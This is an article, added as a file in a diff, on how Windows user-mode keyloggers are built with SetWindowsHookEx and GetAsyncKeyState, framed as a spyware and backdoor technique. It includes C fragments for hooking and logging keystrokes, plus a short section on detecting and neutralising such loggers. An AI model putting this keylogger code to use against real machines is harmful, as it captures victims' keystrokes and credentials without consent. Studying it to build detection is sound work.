@@ -1,0 +1,251 @@
+﻿From the time of computing malwares and spywares have been
+an integral part of the computer era. Keylogging is one the
+most basic and dire need for a backdoor or a spyware, it adds
+a new dimension to the backdoored or a rooted system allowing
+to infiltrate without raising a packet. In this article we
+discuss implementation and detection of Windows user mode
+keyloggers, with that lets roll.
+
+
+==[0x00]==[Contents]=
+
+0x01 Abstract.
+0x02 Things you need.
+0x03 Types of keyloggers.
+0x04 The SetWindowsHookEx method.
+0x05 The GetAsyncKeyState method.
+0x06 Translating the virtual-keys.
+0x07 Conlcusion.
+0x08 References.
+
+==[0x01]==[Abstract]=
+
+From the time of computing malwares and spywares have been
+an integral part of the computer era. Keylogging is one the
+most basic and dire need for a backdoor or a spyware, it adds
+a new dimension to the backdoored or a rooted system allowing
+to infiltrate without raising a packet. In this article we
+discuss implementation and detection of Windows user mode
+keyloggers, with that lets roll.
+
+==[0x02]==[Things you need]
+
+o Th Mirosoft VC++ development environment.
+o MSDN Library.
+o I assume you are well used to the above mentioned things
+
+==[0x03]==[Types of Keyloggers]
+
+On windows keylogging in user mode is acheived using two
+methods they are (They are Windows API calls)
+
+1. SetWindowsHookEx
+2. GetAsyncKeyState
+
+These are not the only two methods available, others are
+there but not quite practical and not seemed to be used in
+the wild.
+
+==[0x04]==[The SetWindowsHookEx method]
+
+This method is very well known and source implementations are
+also available.As the api name suggests, we use windows hooks
+to achieve keylogging.(Many of you might recall this as a method
+to inject DLLs and API hooking),MSDN says
+
+"A hook is a point in the system message-handling mechanism where
+an application can install a subroutine to monitor the message traffic
+in the system and process certain types of messages before they reach
+the target window procedure."
+
+"The SetWindowsHookEx function installs an application-defined hook
+procedure into a hook chain. You would install a hook procedure to
+monitor the system for certain types of events. These events are
+associated either with a specific thread or with all threads in the
+same desktop as the calling thread."
+
+Syntax
+
+HHOOK SetWindowsHookEx(int idHook,HOOKPROC lpfn,HINSTANCE hMod,
+DWORD dwThreadId);
+
+if the idHook is set to WH_KEYBOARD, keyboard events are monitored and
+on each event the hook procedure is called, there is another idHook
+available but it won't work on windows 98, this one works on all of
+them and yes even Win2k3.
+
+For the application to recieve the events globally the hook procedure
+(a.k.a global hook) must be in a library i.e a DLL file.So here are the
+steps
+
+o First we make a DLL file having the hook procedure function, who's
+prototype is
+
+LRESULT CALLBACK KeyboardProc(int code,WPARAM wParam,LPARAM lParam);
+
+The wParam holds the virtual-key code of the key that generated the
+keystroke message and the lparam holds the repeat count, scan code,
+extended-key flag,context code, previous key-state flag, and
+transition-state flag.
+
+Next we need to decode these parameters to ASCII characters and log them
+to file, but as you can see opening and writing each charater to a file
+every time a key strokeis generated will make the process slower, so we
+send these keystrokes back to the application where they will be
+processed and logged to a file, there are numerous methods available
+to do this ( shared memory sections named pipes etc, but they are again
+equivalent to opening and closing a file object), we do it using windows
+messages.
+
+Also we need to keep nag of a few things here (from MSDN)
+a. If code is less than zero, the hook procedure must return the value
+returned by CallNextHookEx
+b. If code is greater than or equal to zero, and the hook procedure
+did not process the message,it is highly recommended that you call
+CallNextHookEx and return the value it returns; otherwise, other
+applications that have installed WH_KEYBOARD hooks will not receive
+hook notifications and may behave incorrectly as a result. If the hook
+procedure processed the message,it may return a nonzero value to prevent
+the system from passing the message to the rest of the hook chain or
+the target window procedure.
+
+NOTE: This method can also be use to sterlize already running keyloggers by
+violating point b.See section 0x06.
+
+Finally our procedure looks like
+
+LRESULT CALLBACK KeyboardProc(int code,WPARAM wParam,LPARAM lParam)
+{
+if(code != HC_NOREMOVE) /*Follow points a and b*/
+if(lParam < 0)
+if(code==HC_ACTION) {
+/*Find the window and send the message*/
+hwnd=FindWindow(szWindowClass,szWindowName);
+SendMessage(hwnd,WM_LOGGERB,wParam,lParam);
+}
+
+return CallNextHookEx(NULL,code,wParam,lParam);
+}
+
+
+o Next comes the main application, we first create a window(of course
+we will hide it);it is required to make this hook(don't know why) work
+properly also since we will be recieving the keystroke information as messages.
+Next we establish the hook, open a file for writing and wait for messages.
+A part of the window callback procedure code looks like:
+
+
+/*Load our library*/
+hm=LoadLibrary(szFile);
+
+/*GetAddress of the Hook procedure*/
+pFunc=(pKBP)GetProcAddress(hm,"KeyboardProc");
+
+/*Establish the hook*/
+hhk=SetWindowsHookEx(WH_KEYBOARD,pFunc,hm,0);
+
+The code for logging the data is similiar to the next method used.The
+rest of the code can be found on my website,see references.
+
+==[0x04]==[The GetAsyncKeyState method]
+
+This method is the most efficient method and does not need an extra dll as in
+SetWIndowsHookEx method.I suppose this is the first time this method is going
+to be publicaly available in source(i found none). MSDN says
+
+The GetAsyncKeyState function determines whether a key is up or down at the
+time the function is called,and whether the key was pressed after a previous
+call to GetAsyncKeyState.
+
+Syntax
+
+SHORT GetAsyncKeyState(int vKey);
+
+the vkey Specifies one of 256 possible virtual-key codes.
+
+To use this we constantly poll using a thread,a loop or a timer to check if a
+key is pressed, if yes we log it.Now it might seem simpler to you but the actual
+implementation in C looks something like this
+
+for(i=0;i<94;i++)
+if(GetAsyncKeyState(VKeys[i].VIR_KEY) & 0x00000001)
+if(GetAsyncKeyState(VKeys[i].VIR_KEY) & 0x8000000) {
+if((VKeys[i].VIR_KEY >=0x41) && (VKeys[i].VIR_KEY <=0x5A)){
+if(!( ( GetKeyState(VK_CAPITAL) & 0x000000001 ) ^ ( GetKeyState(VK_SHIFT) <0 ) ) ) {
+wsprintf(KeyData,"%c",(TCHAR)tolower(VKeys[i].VIR_KEY));
+res=WriteFile(hFile,(LPCVOID)KeyData,1,&BW,NULL);
+if(res==0)
+SendMessage(hwnd,WM_DESTROY,0,0);
+break;
+}
+}
+if( (GetKeyState(VK_SHIFT) <0) && IsTrans(VKeys[i].VIR_KEY) ) {
+wsprintf(KeyData,"%c",(TCHAR)TransKey(VKeys[i].VIR_KEY));
+res=WriteFile(hFile,(LPCVOID)KeyData,1,&BW,NULL);
+if(res==0) SendMessage(hwnd,WM_DESTROY,0,0);
+break;
+}
+
+wsprintf(KeyData,"%s",VKeys[i].Des);
+res=WriteFile(hFile,(LPCVOID)KeyData,strlen(VKeys[i].Des),&BW,NULL);
+if(res==0) SendMessage(hwnd,WM_DESTROY,0,0);
+}
+
+Simple ??. The first two if statements might be hard to get, the first
+if statement checks if a key was pressed after the previous call to GetAsyncKeyState
+(this is the essence of this method which gives it the speed) and the second one
+checks if the key is down, the third if takes care of leaving some keys(printable
+ascii actually, but it can be removed). The fourth and the fifth if statement handles
+checks if shift key is pressed or caps lock is on and rest is about translating and
+logging the keys, see the refrence section for a link to the examples.Very few
+keyloggers use this method, one example is the skl0g keylogger written in visual basic.
+
+==[0x05]==[Translating the virtual-keys]=
+
+Finally we need to translate the virtual key codes, i do this by making a structure
+array as this method allows me to log keys as <UP>,<DOWN>,<Num0> etc. I use two structures
+to take care of the shift key(not neccessary, hey the code is old but it is siad old is gold),
+the structures look like
+
+typedef struct _STABLE {
+int VIR_KEY;
+TCHAR Key;
+}TTABLE;
+
+typedef struct _VTABLE{
+int VIR_KEY;
+TCHAR *Des;
+}VTABLE;
+
+And finally the arrays(for arrays see the source code). Since the shift key
+state and caps lock state is unavailable, we use the GetKeyState API to handle these.
+Next we simply call required functions to return appropiate data i.e character coressponding
+to a key or a descblockedription.
+
+==[0x06]==[Detecting keyloggers]=
+
+By reading this article by now you must have guessed a couple of ways to detect such
+activity. Most keylogger and spyware detectors work on signatures not heuristics. To monitor
+such activity we need to establish a global API hook on GetAsyncKeyState api and monitor the
+rate at wich it is being called, or just scan for executables which call this function
+(this can be easily bypassed), but beware this is also the method used to implement 'Hot Keys'.
+The SetWindowsHookEx activity can be detected similiary.
+
+A SetWindowsHookEx keylogger can be easily steralized by establishing another WH_KEYBOARD
+hook, and not following the required rules(see point b under section 0x04),for this our hook
+procedure will look like:
+
+LRESULT CALLBACK KeyboardProc(int code,WPARAM wParam, LPARAM lParam)
+{
+if(code<0) return CallNextHookEx(NULL,code,wParam,lParam);
+/*The next procedures in the hook chain never get a chance to process messages*/
+if(code>=0) return 0;
+}
+It is to be noted that this should be done after the keylogger is running.
+
+
+==[0x07]==[Conclusion]=
+
+I have outlined the basic methods involved in building a keyloggers.The next step would be
+to encrypt or accesss the kelogged data remotely.I did not discuss these things as i did
+not want this to be a spyware guide.Hope this article spreads information regarding keyloggers.
